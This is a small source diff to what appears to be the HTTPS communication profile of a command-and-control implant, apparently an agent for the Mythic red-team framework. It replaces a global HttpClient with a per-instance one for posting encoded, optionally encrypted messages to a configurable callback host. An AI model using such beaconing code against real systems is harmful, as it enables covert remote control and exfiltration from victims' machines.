@@ -1,6 +1,7 @@
 ﻿using Athena.Utilities;
 using Newtonsoft.Json;
 using System;
+using System.Net;
 using System.Net.Http;
 using System.Threading.Tasks;
 
@@ -46,9 +47,11 @@ namespace Athena.Config
         public string proxyUser { get; set; }
         public PSKCrypto crypt { get; set; }
         public bool encrypted { get; set; }
+        private HttpClient client { get; set; }
 
         public HTTPS(string uuid)
         {
+            this.client = new HttpClient();
             int callbackPort = Int32.Parse("callback_port");
             string callbackHost = "callback_host";
             string callbackURL = $"{callbackHost}:{callbackPort}";
@@ -85,7 +88,7 @@ namespace Athena.Config
                     json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
                 }
 
-                var response = await Globals.client.PostAsync(Globals.mc.MythicConfig.currentConfig.postURL, new StringContent(json));
+                var response = await this.client.PostAsync(Globals.mc.MythicConfig.currentConfig.postURL, new StringContent(json));
                 string msg = response.Content.ReadAsStringAsync().Result;
 
                 if (this.encrypted)
